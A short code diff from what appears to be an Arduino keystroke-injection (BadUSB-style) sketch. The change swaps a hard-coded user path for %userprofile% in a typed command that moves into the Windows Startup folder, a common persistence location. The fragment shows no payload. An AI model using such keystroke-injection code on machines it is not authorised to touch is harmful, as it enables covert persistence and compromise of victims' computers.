@@ -44,9 +44,16 @@ void loop() {
     Keyboard.release(KEY_RETURN);
     delay(1000);
 
-    Keyboard.print("cd C:\\Users\\" + username +
-                   "\\AppData\\Roaming\\Microsoft\\Windows\\Start "
-                   "Menu\\Programs\\Startup");
+    // Keyboard.print("cd C:\\Users\\" + username
+    // +"\\AppData\\Roaming\\Microsoft\\Windows\\Start
+    // ""Menu\\Programs\\Startup");
+
+    //  %userprofile%\AppData\Roaming\Microsoft\Windows\Start
+    //  Menu\Programs\Startup
+    Keyboard.print(
+        "cd %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start "
+        "Menu\\Programs\\Startup");
+
     delay(500);
     Keyboard.press(KEY_RETURN);
     delay(100);
